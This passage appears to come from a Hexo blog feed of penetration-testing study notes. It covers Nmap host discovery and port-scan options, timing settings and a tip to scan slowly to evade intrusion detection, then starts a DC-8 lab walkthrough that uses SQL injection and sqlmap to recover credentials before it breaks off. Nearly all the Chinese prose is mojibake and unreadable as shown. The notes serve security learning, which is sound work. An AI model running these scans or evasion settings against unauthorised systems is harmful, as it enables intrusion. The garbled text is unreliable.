TARGETS</code>ã€‚æ­¤é€‰é¡¹å°†ä¸ºæ‚¨æä¾› Nmap å°†æ‰«æçš„ä¸»æœºçš„è¯¦ç»†åˆ—è¡¨ï¼Œè€Œæ— éœ€æ‰«æå®ƒä»¬ï¼›ä½†æ˜¯ï¼ŒNmap å°†å°è¯•å¯¹æ‰€æœ‰ç›®æ ‡è¿›è¡Œåå‘DNSè§£æä»¥è·å–å…¶åç§°ã€‚åç§°å¯èƒ½ä¼šå‘æ¸—é€æµ‹è¯•äººå‘˜é€éœ²å„ç§ä¿¡æ¯ã€‚ï¼ˆå¦‚æœæ‚¨ä¸æƒ³è®© Nmap è®¿é—®DNSæœåŠ¡å™¨ï¼Œå¯ä»¥æ·»åŠ <code>-n</code>ã€‚ï¼‰</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407081651586.png" alt="image-20240708165132302"></p><p>ä¸‹é¢æ˜¯tcp/ipä¸ƒå±‚å‚è€ƒæ¨¡å‹</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png"></p><p>ä»ä¸‹åˆ°ä¸Šæ˜¯ ç‰©ç†å±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç½‘ç»œå±‚ï¼Œä¼ è¾“å±‚ï¼Œä¼šè¯å±‚ï¼Œè¡¨ç¤ºå±‚ï¼Œåº”ç”¨å±‚ã€‚</p><p>1.æ•°æ®é“¾è·¯å±‚çš„ARP</p><p>2.ç½‘ç»œå±‚çš„ICMP</p><p>3.ä¼ è¾“å±‚çš„TCP ä¼ è¾“å±‚çš„UDP</p><p>ARPæœ‰ä¸€ä¸ªç›®çš„ï¼šå‘ç½‘ç»œæ®µä¸Šçš„å¹¿æ’­åœ°å€å‘é€ä¸€ä¸ªå¸§ï¼Œå¹¶è¦æ±‚å…·æœ‰ç‰¹å®š IP åœ°å€çš„è®¡ç®—æœºé€šè¿‡æä¾›å…¶ MACï¼ˆç¡¬ä»¶ï¼‰åœ°å€æ¥å“åº”ã€‚</p><p>ICMP æœ‰<a href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml">å¾ˆå¤šç§ç±»å‹</a>ã€‚ICMP ping ä½¿ç”¨ç±»å‹ 8ï¼ˆEchoï¼‰å’Œç±»å‹ 0ï¼ˆEcho Replyï¼‰ã€‚</p><p>å¦‚æœè¦ ping åŒä¸€å­ç½‘ä¸Šçš„ç³»ç»Ÿï¼Œåˆ™ARPæŸ¥è¯¢åº”å…ˆäº ICMP Echoã€‚</p><p>å°½ç®¡ TCP å’ŒUDPå±äºä¼ è¾“å±‚ï¼Œä½†å‡ºäºç½‘ç»œæ‰«æç›®çš„ï¼Œæ‰«æå™¨å¯ä»¥å‘å¸¸ç”¨ TCP æˆ–UDPç«¯å£å‘é€ç‰¹åˆ¶æ•°æ®åŒ…ï¼Œä»¥æ£€æŸ¥ç›®æ ‡æ˜¯å¦ä¼šå“åº”ã€‚æ­¤æ–¹æ³•éå¸¸æœ‰æ•ˆï¼Œå°¤å…¶æ˜¯åœ¨ ICMP Echo è¢«é˜»æ­¢çš„æƒ…å†µä¸‹ã€‚</p><h4 id="1-nmapä½¿ç”¨arpè¿›è¡Œä¸»æœºå‘ç°"><a href="#1-nmapä½¿ç”¨arpè¿›è¡Œä¸»æœºå‘ç°" class="headerlink" title="1.nmapä½¿ç”¨arpè¿›è¡Œä¸»æœºå‘ç°"></a>1.nmapä½¿ç”¨arpè¿›è¡Œä¸»æœºå‘ç°</h4><p>nmap -sn ip æ˜¯ä»…æ‰«æå­˜æ´»ä¸»æœºï¼Œè€Œä¸æ‰«æç«¯å£ã€‚</p><p>nmap -PR -sn ip æ˜¯åˆ©ç”¨arpæ‰«æä»…å­˜æ´»ä¸»æœº</p><p>æœ‰ä¸€ä¸ªå·¥å…·arp-scan æ˜¯ä¸“é—¨åˆ©ç”¨arpåè®®å»æ‰«ææœ¬ç½‘æ®µçš„ä¸»æœº arp-scan -l</p><p>å¦‚æœæœ‰å¤šä¸ªæ¥å£ï¼Œåˆ©ç”¨arp-scanè¿›è¡Œæ‰«ææ—¶ å¯ä»¥åˆ©ç”¨å‘½ä»¤ arp-scan -I eth0 -l å‘æ¥å£eth0 å‘é€arpæŸ¥è¯¢</p><h4 id="2-nmapä½¿ç”¨ICMPè¿›è¡Œä¸»æœºå‘ç°"><a href="#2-nmapä½¿ç”¨ICMPè¿›è¡Œä¸»æœºå‘ç°" class="headerlink" title="2.nmapä½¿ç”¨ICMPè¿›è¡Œä¸»æœºå‘ç°"></a>2.nmapä½¿ç”¨ICMPè¿›è¡Œä¸»æœºå‘ç°</h4><p>æœ‰äº›é˜²ç«å¢™ä¼šé˜»æ­¢icmpåŒ…çš„å›æ˜¾è¯·æ±‚ æ¯”å¦‚ï¼šæ–°ç‰ˆæœ¬çš„ MS Windows  </p><p>nmap -PE -sn ip åˆ©ç”¨icmpè¿›è¡Œå­˜æ´»ä¸»æœºçš„æ¢ç´¢</p><p>ç”±äº ICMP å›æ˜¾è¯·æ±‚å¾€å¾€ä¼šè¢«é˜»æ­¢ï¼Œå› æ­¤æ‚¨å¯èƒ½è¿˜ä¼šè€ƒè™‘ä½¿ç”¨ ICMP æ—¶é—´æˆ³æˆ– ICMP åœ°å€æ©ç è¯·æ±‚æ¥åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦åœ¨çº¿ã€‚Nmapä½¿ç”¨æ—¶é—´æˆ³è¯·æ±‚ï¼ˆICMP ç±»å‹ 13ï¼‰å¹¶æ£€æŸ¥å®ƒæ˜¯å¦ä¼šæ”¶åˆ°æ—¶é—´æˆ³å›å¤ï¼ˆICMP ç±»å‹ 14ï¼‰ã€‚æ·»åŠ è¯¥<code>-PP</code>é€‰é¡¹ä¼šå‘Šè¯‰Nmapä½¿ç”¨ ICMP æ—¶é—´æˆ³è¯·æ±‚ã€‚</p><p>nmap -PP -sn ip</p><p>ç±»ä¼¼åœ°ï¼ŒNmapä½¿ç”¨åœ°å€æ©ç æŸ¥è¯¢ï¼ˆICMP ç±»å‹ 17ï¼‰å¹¶æ£€æŸ¥æ˜¯å¦æ”¶åˆ°åœ°å€æ©ç å›å¤ï¼ˆICMP ç±»å‹ 18ï¼‰ã€‚å¯ä»¥ä½¿ç”¨é€‰é¡¹å¯ç”¨æ­¤æ‰«æ<code>-PM</code>ã€‚</p><p>nmap -PM -sn ip </p><h4 id="3-nmapä½¿ç”¨tcp-udpè¿›è¡Œä¸»æœºå‘ç°"><a href="#3-nmapä½¿ç”¨tcp-udpè¿›è¡Œä¸»æœºå‘ç°" class="headerlink" title="3.nmapä½¿ç”¨tcp/udpè¿›è¡Œä¸»æœºå‘ç°"></a>3.nmapä½¿ç”¨tcp/udpè¿›è¡Œä¸»æœºå‘ç°</h4><p>TCPåŒæ­¥å’Œç¡®è®¤ping</p><p>nmap -PS -sn ip   nmap SYN ping</p><p>nmap -PA -sn ip  (å¿…é¡»åœ¨ç‰¹æƒæ¨¡å¼ä¸‹è¿›è¡Œ)  nmap ACK ping</p><p>-PSç«¯å£å·</p><p>-PAç«¯å£å·</p><p>UDP ping</p><p>ä¸€ä¸ªUDPæ•°æ®åŒ…å‘é€åˆ°ä¸€ä¸ªå¼€æ”¾çš„UDPç«¯å£ï¼Œå¹¶æ²¡æœ‰è§¦å‘ä»»ä½•å“åº”ã€‚ä½†æ˜¯ï¼Œå‘ä»»ä½•å…³é—­çš„UDPç«¯å£å‘é€UDPæ•°æ®åŒ…å¯ä»¥è§¦å‘å“åº”ï¼Œé—´æ¥è¡¨æ˜ç›®æ ‡åœ¨çº¿ã€‚</p><p>namp -PU -sn ip</p><p>-PUç«¯å£å·</p><p>masscanä¹Ÿæ˜¯ä¸€ä¸ªæ‰«æä¸»æœºçš„ä¸€ä¸ªå·¥å…· é€Ÿåº¦æ›´å¿« ä¸»è¦ç”¨äºå¤§è§„æ¨¡ç½‘ç»œæ‰«æ</p><p>Nmap çš„é»˜è®¤è¡Œä¸ºæ˜¯ä½¿ç”¨åå‘DNSåœ¨çº¿ä¸»æœºã€‚ç”±äºä¸»æœºåå¯ä»¥æ­ç¤ºå¾ˆå¤šä¿¡æ¯ï¼Œå› æ­¤è¿™å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„æ­¥éª¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨ä¸æƒ³å‘é€æ­¤ç±»DNSæŸ¥è¯¢ï¼Œåˆ™å¯ä»¥<code>-n</code>è·³è¿‡æ­¤æ­¥éª¤ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapå°†æŸ¥æ‰¾åœ¨çº¿ä¸»æœºï¼›ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¯¥é€‰é¡¹<code>-R</code>æŸ¥è¯¢DNSæœåŠ¡å™¨ï¼Œå³ä½¿æ˜¯ç¦»çº¿ä¸»æœºä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¦‚æœæ‚¨æƒ³ä½¿ç”¨ç‰¹å®šçš„DNSæœåŠ¡å™¨ï¼Œå¯ä»¥æ·»åŠ è¯¥ <code>--dns-servers DNS_SERVER</code> é€‰é¡¹ã€‚</p><table><thead><tr><th>æ‰«æç±»å‹</th><th>ç¤ºä¾‹å‘½ä»¤</th></tr></thead><tbody><tr><td>ARPæ‰«æ</td><td><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP å›æ˜¾æ‰«æ</td><td><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP æ—¶é—´æˆ³æ‰«æ</td><td><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP åœ°å€æ©ç æ‰«æ</td><td><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td>TCP SYN Ping æ‰«æ</td><td><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>TCP ACK Ping æ‰«æ</td><td><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>UDP Ping æ‰«æ</td><td><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><p><code>-sn</code>å¦‚æœæ‚¨åªå¯¹ä¸»æœºå‘ç°æ„Ÿå…´è¶£ï¼Œè€Œä¸å¯¹ç«¯å£æ‰«ææ„Ÿå…´è¶£ï¼Œ è¯·è®°å¾—æ·»åŠ ã€‚çœç•¥<code>-sn</code>å°†ä½¿Nmapé»˜è®¤å¯¹æ´»åŠ¨ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€‚</p><table><thead><tr><th>é€‰é¡¹</th><th>ç›®çš„</th></tr></thead><tbody><tr><td><code>-n</code></td><td>æ— éœ€DNSæŸ¥æ‰¾</td></tr><tr><td><code>-R</code></td><td>åå‘DNSæŸ¥æ‰¾æ‰€æœ‰ä¸»æœº</td></tr><tr><td><code>-sn</code></td><td>ä»…ä¸»æœºå‘ç°</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap åŸºæœ¬ç«¯å£æ‰«æ</title>
    <link href="/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-åŸºæœ¬ç«¯å£æ‰«æ"><a href="#Nmap-åŸºæœ¬ç«¯å£æ‰«æ" class="headerlink" title="Nmap åŸºæœ¬ç«¯å£æ‰«æ"></a>Nmap åŸºæœ¬ç«¯å£æ‰«æ</h1><p>ä¸Šé¢ä»‹ç»äº†nmapæ‰«æçš„å‰ä¸‰ä¸ªæ­¥éª¤ï¼Œæšä¸¾ç›®æ ‡ï¼Œå‘ç°å­˜æ´»ä¸»æœºï¼Œåå‘DNSæŸ¥æ‰¾ã€‚</p><p>ä¸‹é¢å°†ä»‹ç»ç«¯å£ä¿¡æ¯çš„æ‰«æã€‚</p><p>Nmapè€ƒè™‘ä»¥ä¸‹å…­ç§çŠ¶æ€ï¼š</p><ol><li><strong>Open</strong>ï¼šè¡¨ç¤ºæœåŠ¡æ­£åœ¨ç›‘å¬æŒ‡å®šç«¯å£ã€‚</li><li><strong>Closed</strong>ï¼šè¡¨ç¤ºæ²¡æœ‰æœåŠ¡åœ¨ç›‘å¬æŒ‡å®šç«¯å£ï¼Œå°½ç®¡è¯¥ç«¯å£å¯ä»¥è®¿é—®ã€‚å¯è®¿é—®æ˜¯æŒ‡è¯¥ç«¯å£å¯ä»¥è®¿é—®ï¼Œå¹¶ä¸”æœªè¢«é˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨è®¾å¤‡/ç¨‹åºé˜»æ­¢ã€‚</li><li><strong>Filtered</strong>ï¼šè¡¨ç¤ºNmapæ— æ³•ç¡®å®šç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­ï¼Œå› ä¸ºç«¯å£æ— æ³•è®¿é—®ã€‚æ­¤çŠ¶æ€é€šå¸¸æ˜¯ç”±äºé˜²ç«å¢™é˜»æ­¢Nmapåˆ°è¾¾è¯¥ç«¯å£ã€‚Nmapçš„æ•°æ®åŒ…å¯èƒ½è¢«é˜»æ­¢åˆ°è¾¾ç«¯å£ï¼›æˆ–è€…å“åº”è¢«é˜»æ­¢åˆ°è¾¾Nmapçš„ä¸»æœºã€‚</li><li><strong>UnFiltered</strong>ï¼šè¡¨ç¤ºNmapæ— æ³•ç¡®å®šç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­ï¼Œå°½ç®¡è¯¥ç«¯å£å¯ä»¥è®¿é—®ã€‚ä½¿ç”¨ ACK æ‰«ææ—¶ä¼šé‡åˆ°æ­¤çŠ¶æ€<code>-sA</code>ã€‚</li><li><strong>Open|Filtered</strong>ï¼šè¿™æ„å‘³ç€Nmapæ— æ³•ç¡®å®šè¯¥ç«¯å£æ˜¯å¼€æ”¾çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚</li><li><strong>Closed|Filtered</strong>ï¼šè¿™æ„å‘³ç€Nmapæ— æ³•å†³å®šç«¯å£æ˜¯å¦å…³é—­æˆ–è¢«è¿‡æ»¤ã€‚</li></ol><p>ä¸‹å›¾æ˜¯RFC793 å®šä¹‰çš„tcpè¡¨å¤´</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/79ca8e4acbd573a27cee413cde927769.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/79ca8e4acbd573a27cee413cde927769.png"></p><p>ç¬¬ä¸€è¡Œæ˜¯æºç«¯å£å·å’Œç›®æ ‡ä¸»æœºç«¯å£å·ã€‚</p><p>ç¬¬äºŒè¡Œå’Œç¬¬ä¸‰è¡Œæ˜¯åºåˆ—å·å’Œç¡®è®¤å·ã€‚æ¯è¡Œåˆ†é…äº†32ä½(4å­—èŠ‚)ï¼Œæ€»å…±6è¡Œï¼Œå…±24å­—èŠ‚ã€‚</p><p>TCPæ ‡å¤´æ ‡å¿—ä¸ºï¼š</p><ol><li><strong>URG</strong>ï¼šç´§æ€¥æ ‡å¿—è¡¨ç¤ºç´§æ€¥æŒ‡é’ˆå­—æ®µå¾ˆé‡è¦ã€‚ç´§æ€¥æŒ‡é’ˆè¡¨ç¤ºä¼ å…¥æ•°æ®æ˜¯ç´§æ€¥çš„ï¼Œå¹¶ä¸”è®¾ç½®äº† URG æ ‡å¿—çš„TCPæ®µä¼šç«‹å³å¤„ç†ï¼Œè€Œæ— éœ€è€ƒè™‘ç­‰å¾…å…ˆå‰å‘é€çš„TCPæ®µã€‚</li><li><strong>ACK</strong>ï¼šç¡®è®¤æ ‡å¿—ï¼Œè¡¨ç¤ºç¡®è®¤å·æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒç”¨äºç¡®è®¤æ”¶åˆ°TCPæ®µã€‚</li><li><strong>PSH</strong>ï¼šæ¨é€æ ‡å¿—ï¼Œè¦æ±‚TCPåŠæ—¶å°†æ•°æ®ä¼ é€’ç»™åº”ç”¨ç¨‹åºã€‚</li><li><strong>RST</strong>ï¼šé‡ç½®æ ‡å¿—ç”¨äºé‡ç½®è¿æ¥ã€‚å…¶ä»–è®¾å¤‡ï¼ˆä¾‹å¦‚é˜²ç«å¢™ï¼‰å¯èƒ½ä¼šå‘é€è¯¥æ ‡å¿—ä»¥æ–­å¼€TCP è¿æ¥ã€‚å½“æ•°æ®å‘é€åˆ°ä¸»æœºå¹¶ä¸”æ¥æ”¶ç«¯æ²¡æœ‰æœåŠ¡å¯ä»¥åº”ç­”æ—¶ï¼Œä¹Ÿä¼šä½¿ç”¨æ­¤æ ‡å¿—ã€‚</li><li><strong>SYN</strong>ï¼šåŒæ­¥æ ‡å¿—ç”¨äºå¯åŠ¨TCPä¸‰æ¬¡æ¡æ‰‹å¹¶ä¸å…¶ä»–ä¸»æœºåŒæ­¥åºåˆ—å·ã€‚åºåˆ—å·åº”åœ¨TCPè¿æ¥å»ºç«‹æœŸé—´éšæœºè®¾ç½®ã€‚</li><li><strong>FIN</strong>ï¼šå‘é€æ–¹æ²¡æœ‰æ›´å¤šæ•°æ®å¯å‘é€ã€‚</li></ol><h2 id="tcpæ‰«æè¿æ¥"><a href="#tcpæ‰«æè¿æ¥" class="headerlink" title="tcpæ‰«æè¿æ¥"></a>tcpæ‰«æè¿æ¥</h2><p><strong>nmap -sT ip</strong> æ‰«ætcpç«¯å£</p><p>å·²å…³é—­çš„TCPç«¯å£ä¼šä½¿ç”¨ RST/ACK å“åº” SYN æ•°æ®åŒ…ï¼Œä»¥è¡¨æ˜å®ƒæœªæ‰“å¼€ã€‚å½“æˆ‘ä»¬å°è¯•ä¸æ‰€æœ‰å·²å…³é—­çš„ç«¯å£å‘èµ·TCPä¸‰æ¬¡æ¡æ‰‹æ—¶ï¼Œæ­¤æ¨¡å¼å°†é‡å¤å‡ºç°ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8390020a13d6f22f49233833f6265de6.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8390020a13d6f22f49233833f6265de6.png"></p><p>â€‹                                                             tcpä¸‰æ¬¡æ¡æ‰‹</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/514972cd54b3f58c83f951978ea9183e.png" alt="img"></p><p>â€‹                                                         nmapè¿›è¡Œtcpç«¯å£çš„ä¸€ä¸ªæ¢æµ‹</p><p><code>-F</code> å¿«é€Ÿæ‰«æ ä»1000ä¸ªç«¯å£å‡å°‘åˆ°æ‰«æ100ä¸ªå¸¸ç”¨çš„ç«¯å£ã€‚</p><p><code>-r</code>è¿˜å¯ä»¥æ·»åŠ é€‰é¡¹ä»¥æŒ‰è¿ç»­é¡ºåºè€Œä¸æ˜¯éšæœºé¡ºåºæ‰«æç«¯å£ã€‚å½“æµ‹è¯•ç«¯å£æ˜¯å¦ä»¥ä¸€è‡´çš„æ–¹å¼æ‰“å¼€æ—¶ï¼ˆä¾‹å¦‚ï¼Œå½“ç›®æ ‡å¯åŠ¨æ—¶ï¼‰ï¼Œæ­¤é€‰é¡¹å¾ˆæœ‰ç”¨ã€‚</p><h2 id="tcp-SYNæ‰«æ"><a href="#tcp-SYNæ‰«æ" class="headerlink" title="tcp SYNæ‰«æ"></a>tcp SYNæ‰«æ</h2><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/48e631fd3deba4a2b759ca48405fcc08.png" alt="img"></p><p>â€‹                                                     nmapåˆ©ç”¨synå¯¹ç«¯å£è¿›è¡Œæ‰«æ</p><p><code>nmap -sS IP</code></p><p>ä½¿ç”¨SYNè¿›è¡Œç«¯å£æ‰«ææ—¶ï¼Œä¸éœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ã€‚</p><h2 id="UDPæ‰«æ"><a href="#UDPæ‰«æ" class="headerlink" title="UDPæ‰«æ"></a>UDPæ‰«æ</h2><p>UDPæ˜¯ä¸€ç§æ— è¿æ¥åè®®ï¼Œå› æ­¤å®ƒä¸éœ€è¦ä»»ä½•æ¡æ‰‹å³å¯å»ºç«‹è¿æ¥ã€‚æˆ‘ä»¬æ— æ³•ä¿è¯ç›‘å¬UDPç«¯å£çš„æœåŠ¡ä¼šå“åº”æˆ‘ä»¬çš„æ•°æ®åŒ…ã€‚ä½†æ˜¯ï¼Œå¦‚æœå°†UDPæ•°æ®åŒ…å‘é€åˆ°å·²å…³é—­çš„ç«¯å£ï¼Œåˆ™ä¼šè¿”å› ICMP ç«¯å£ä¸å¯è¾¾é”™è¯¯ï¼ˆç±»å‹ 3ï¼Œä»£ç  3ï¼‰ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¯¥é€‰é¡¹é€‰æ‹©UDPæ‰«æ <code>-sU</code>ï¼›æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥å°†å…¶ä¸å¦ä¸€ä¸ªTCPæ‰«æç»“åˆä½¿ç”¨ã€‚</p><p>å¦‚æœæ˜¯å¼€å¯çš„ç«¯å£ï¼Œå‘é€UDPæ•°æ®åŒ…çš„è¯ï¼Œå°±ä¸ä¼šè¿”å›icmpä¸å¯è¾¾ï¼Œè€Œæ˜¯æ— è¿”å›ç»“æœã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/085088cd1b2b122312b1ee952c4aa0f7.png" alt="img"></p><p>â€‹                                                       udpç«¯å£å¼€å¯</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b8b32517699b96777641a97dbf9d880.png" alt="img"></p><p>â€‹                                                            udpç«¯å£å…³é—­</p><h2 id="å¾®è°ƒèŒƒå›´å’Œæ€§èƒ½"><a href="#å¾®è°ƒèŒƒå›´å’Œæ€§èƒ½" class="headerlink" title="å¾®è°ƒèŒƒå›´å’Œæ€§èƒ½"></a>å¾®è°ƒèŒƒå›´å’Œæ€§èƒ½</h2><p>-p-ï¼šæ‰«ææ‰€æœ‰çš„ç«¯å£ä¿¡æ¯ã€‚</p><p>-p80-100: å°†æ‰«æ80åˆ°100è¿™ä¸­é—´çš„ç«¯å£ï¼ŒåŒ…æ‹¬80å’Œ100</p><p>å¦‚æœæƒ³æ‰«ææœ€å¸¸è§çš„100ä¸ªç«¯å£åŠ  -F</p><p>ä½¿ç”¨<code>--top-ports 10</code>å°†æ£€æŸ¥åä¸ªæœ€å¸¸è§çš„ç«¯å£ã€‚</p><p>å¯ä»¥ä½¿ç”¨-T&lt;0-5&gt; æ¥æ§åˆ¶æ‰«ææ—¶é—´</p><ul><li>paranoid (0)</li><li>sneaky (1)</li><li>polite (2)   </li><li>normal (3)  //æ­£å¸¸</li><li>aggressive (4)  //æ”»å‡»æ€§</li><li>insane (5)  //ç–¯ç‹‚</li></ul><p>ä¸ºäº†é¿å…IDS(å…¥ä¾µæ£€æµ‹)è­¦æŠ¥ï¼Œæ‚¨å¯ä»¥è€ƒè™‘ä½¿ç”¨<code>-T0</code>æˆ–<code>-T1</code>ã€‚ä¾‹å¦‚ï¼Œ<code>-T0</code>ä¸€æ¬¡æ‰«æä¸€ä¸ªç«¯å£ï¼Œå¹¶åœ¨å‘é€æ¯ä¸ªæ¢æµ‹ä¹‹é—´ç­‰å¾… 5 åˆ†é’Ÿï¼Œå› æ­¤æ‚¨å¯ä»¥çŒœæµ‹æ‰«æä¸€ä¸ªç›®æ ‡éœ€è¦å¤šé•¿æ—¶é—´æ‰èƒ½å®Œæˆã€‚å¦‚æœæ‚¨ä¸æŒ‡å®šä»»ä½•æ—¶é—´ï¼ŒNmapå°†ä½¿ç”¨æ­£å¸¸<code>-T3</code>ã€‚è¯·æ³¨æ„ï¼Œ<code>-T5</code> åœ¨é€Ÿåº¦æ–¹é¢æ˜¯æœ€å¿«çš„ï¼›ä½†æ˜¯ï¼Œç”±äºæ•°æ®åŒ…ä¸¢å¤±çš„å¯èƒ½æ€§å¢åŠ ï¼Œè¿™ä¼šå½±å“æ‰«æç»“æœçš„å‡†ç¡®æ€§ã€‚è¯·æ³¨æ„ï¼Œ<code>-T4</code>é€šå¸¸åœ¨ CTF æœŸé—´å’Œå­¦ä¹ æ‰«æç»ƒä¹ ç›®æ ‡æ—¶ä½¿ç”¨ï¼Œ<strong>è€Œ<code>-T1</code>é€šå¸¸åœ¨éšèº«æ›´é‡è¦çš„å®é™…äº¤æˆ˜ä¸­ä½¿ç”¨ã€‚</strong></p><p><code>--min-rate</code> <number>   <code>--max-rate</code> <number>  æ§åˆ¶æ•°æ®åŒ…çš„é€Ÿç‡ <code>--max-rate=10</code> æ„æ€å°±æ˜¯æ¯ç§’å‘é€çš„æ•°æ®åŒ…ä¸å¾—è¶…è¿‡10</p><p><code>--min-parallelism</code> <numprobes>  <code>--max-parallelism</code> <numprobes>  æŒ‡å®šæœ€å¤§æœ€å°å¹¶è¡Œçš„æ•°é‡ <code>--min-parallelism=512</code> è¡¨ç¤º nmapè‡³å°‘ä¿æŒ512ä¸ªå¹¶è¡Œæ¢æµ‹ï¼Œè¿™512ä¸ªå¹¶è¡Œæ¢æµ‹ä¸ä¸»æœºå­˜æ´»å’Œç«¯å£æ‰«ææœ‰å…³ã€‚</p><h2 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h2><p>è¿™ä¸ªæˆ¿é—´æ¶µç›–äº†ä¸‰ç§ç±»å‹çš„æ‰«æã€‚</p><table><thead><tr><th>ç«¯å£æ‰«æç±»å‹</th><th>ç¤ºä¾‹å‘½ä»¤</th></tr></thead><tbody><tr><td>TCPè¿æ¥æ‰«æ</td><td><code>nmap -sT 10.10.17.29</code></td></tr><tr><td>TCP SYN æ‰«æ</td><td><code>sudo nmap -sS 10.10.17.29</code></td></tr><tr><td>UDPæ‰«æ</td><td><code>sudo nmap -sU 10.10.17.29</code></td></tr></tbody></table><table><thead><tr><th>é€‰é¡¹</th><th>ç›®çš„</th></tr></thead><tbody><tr><td><code>-p-</code></td><td>æ‰€æœ‰ç«¯å£</td></tr><tr><td><code>-p1-1023</code></td><td>æ‰«æç«¯å£ 1 è‡³ 1023</td></tr><tr><td><code>-F</code></td><td>100 ä¸ªæœ€å¸¸è§çš„ç«¯å£</td></tr><tr><td><code>-r</code></td><td>æŒ‰è¿ç»­é¡ºåºæ‰«æç«¯å£</td></tr><tr><td><code>-T&lt;0-5&gt;</code></td><td>-T0 æœ€æ…¢ï¼ŒT5 æœ€å¿«</td></tr><tr><td><code>--max-rate 50</code></td><td>é€Ÿç‡ &lt;= 50 æ•°æ®åŒ…/ç§’</td></tr><tr><td><code>--min-rate 15</code></td><td>é€Ÿç‡ &gt;= 15 æ•°æ®åŒ…/ç§’</td></tr><tr><td><code>--min-parallelism 100</code></td><td>è‡³å°‘ 100 ä¸ªå¹¶è¡Œæ¢é’ˆ</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-8</title>
    <link href="/2024/04/18/DC-8/"/>
    <url>/2024/04/18/DC-8/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æä¸€æ³¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404182015635.png" alt="image-20240418201540496"></p><p>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22å’Œ80ç«¯å£</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261913801.png" alt="image-20240426191323619"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹å¯ä»¥è¯•è¯•sqlæ³¨å…¥ï¼Œæ‰‹å·¥å‘ç°æ˜¯å­˜åœ¨çš„ã€‚åˆ©ç”¨sqlmapè¿›è¡Œè·‘ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261914612.png" alt="image-20240426191428509"></p><p>å‘ç°è´¦æˆ·å¯†ç ï¼Œè¿™ä¸ªå¯†ç 